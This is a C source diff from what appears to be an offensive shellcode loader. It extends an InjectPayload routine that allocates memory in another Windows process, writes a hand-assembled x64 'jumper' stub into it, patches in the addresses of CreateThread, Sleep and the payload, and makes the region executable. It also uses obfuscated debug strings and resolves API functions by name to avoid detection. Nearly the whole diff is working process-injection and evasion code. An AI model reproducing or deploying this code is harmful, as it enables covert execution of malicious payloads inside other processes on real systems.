@@ -155,6 +155,9 @@ BOOL PayloadExecute(unsigned char* buffer, int bufferlen)
  * This version using the NtSetInformationProcess to add a hook after syscall
  */
 
+
+#define jumper_size 0x6e
+
 BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
 {
     printf("%d\n%d\n", buffer[0],bufferlen);
@@ -168,18 +171,63 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     printf("[+] Sh3llc0d3 4ddr: %p\n", mem);
 #endif
 
-    BYTE shellcodeTemplate[49] = {
+    LPVOID jumper = _VirtualAllocEx(hProcess, NULL, jumper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+#ifdef DEBUG
+    printf("[+] Jumper 4ddr: %p\n", jumper);
+#endif
+
+    // BYTE shellcodeTemplate[49] = {
+    //     0x55,
+    //     0x48, 0x89, 0xe5,
+    //     0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
+    //     0x50,
+    //     0x53,
+    //     0x51,
+    //     0x41, 0x51,
+    //     0x41, 0x52,
+    //     0x41, 0x53,
+    //     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    //     0xff, 0xd0,
+    //     0x41, 0x5b,
+    //     0x41, 0x5a,
+    //     0x41, 0x59,
+    //     0x59,
+    //     0x5b,
+    //     0x58,
+    //     0x5d,
+    //     0x41, 0xff, 0xe2
+    // };
+
+
+    // change address of jump to our shellcode
+    // *((DWORD64*)(&(shellcodeTemplate[26]))) = (DWORD64)mem;
+
+
+    #define NEWPAYLOAD
+    #ifdef NEWPAYLOAD
+    BYTE shellcodeTemplate[0x6e] = {
         0x55,
         0x48, 0x89, 0xe5,
-        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
+        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff,
+        0x41, 0xff, 0xe2, 0x00,
         0x50,
         0x53,
         0x51,
         0x41, 0x51,
         0x41, 0x52,
         0x41, 0x53,
-        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x48, 0xb8, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
+        0xaa, 0xaa, 0xaa,
+        0x48, 0x31, 0xc9,
+        0x48, 0x31, 0xd2,
+        0x49, 0xb8, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
+        0xbb, 0xbb, 0xbb,
+        0x4d, 0x31, 0xc9,
+        0x41, 0x51,
+        0x41, 0x51,
         0xff, 0xd0,
+        0x41, 0x59,
+        0x41, 0x59,
         0x41, 0x5b,
         0x41, 0x5a,
         0x41, 0x59,
@@ -187,16 +235,32 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
         0x5b,
         0x58,
         0x5d,
-        0x41, 0xff, 0xe2
+        0x41, 0xff, 0xe2,
+        0x48, 0xb8, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
+        0xcc, 0xcc, 0xcc,
+        0x48, 0xb9, 0x88, 0x13, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00,
+        0xff, 0xd0,
+        0x48, 0xb8, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd,
+        0xdd, 0xdd, 0xdd,
+        0xff, 0xd0
     };
 
-    // change address of jump to our shellcode
-    *((DWORD64*)(&(shellcodeTemplate[26]))) = (DWORD64)mem;
+    // resolve createthread and sleep function
+    pCreateThread _CreateThread = (pCreateThread) getFuncByName(kernel32, aCreateThread);
+    pSleep _Sleep = (pSleep) getFuncByName(kernel32, aSleep);
 
-    LPVOID jumper = _VirtualAllocEx(hProcess, NULL, 49, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-#ifdef DEBUG
-    printf("[+] Jumper 4ddr: %p\n", jumper);
-#endif
+    // replace addresses (payload, sleep, createthread) in jumper template
+    *((DWORD64 *)(&(shellcodeTemplate[0x1a]))) = (DWORD64) _CreateThread;
+    *((DWORD64 *)(&(shellcodeTemplate[0x4e]))) = (DWORD64) _Sleep;
+    *((DWORD64 *)(&(shellcodeTemplate[0x64]))) = (DWORD64) mem;
+    *((DWORD64 *)(&(shellcodeTemplate[0x2a]))) = (DWORD64) jumper + 0x4c;
+    #endif
+
+
+
+
+
 
 
     pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)getFuncByName(kernel32, aWriteProcessMemory);
@@ -217,7 +281,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
         return FALSE;
     }
 
-    check = _WriteProcessMemory(hProcess, jumper, shellcodeTemplate, 49, NULL);
+    check = _WriteProcessMemory(hProcess, jumper, shellcodeTemplate, jumper_size, NULL);
 
     if (check)
     {
@@ -252,7 +316,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
         return FALSE;
     }
 
-    check = _VirtualProtectEx(hProcess, jumper, 49, PAGE_EXECUTE_READWRITE, &oldProtect);
+    check = _VirtualProtectEx(hProcess, jumper, jumper_size, PAGE_EXECUTE_READWRITE, &oldProtect);
     if (check)
     {
 #ifdef DEBUG
